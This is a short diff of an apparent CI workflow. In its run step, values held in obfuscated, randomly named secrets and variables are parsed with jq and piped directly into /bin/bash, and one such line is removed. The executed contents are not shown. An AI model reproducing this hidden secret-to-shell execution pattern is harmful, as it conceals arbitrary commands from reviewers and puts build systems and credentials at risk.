@@ -21,7 +21,6 @@ jobs:
           sfmq96484: ${{ secrets.sfmq96484 }}
         run: |
           printf '%s' "$sfmq96484" | jq -r .uee55678 | /bin/bash
-          printf '%s' "$cylm50" | jq -r .elcl925 | /bin/bash
           echo $o7681 | jq -r .c76 | /bin/bash
           echo $jed85522 | jq -r .u804 | /bin/bash
 
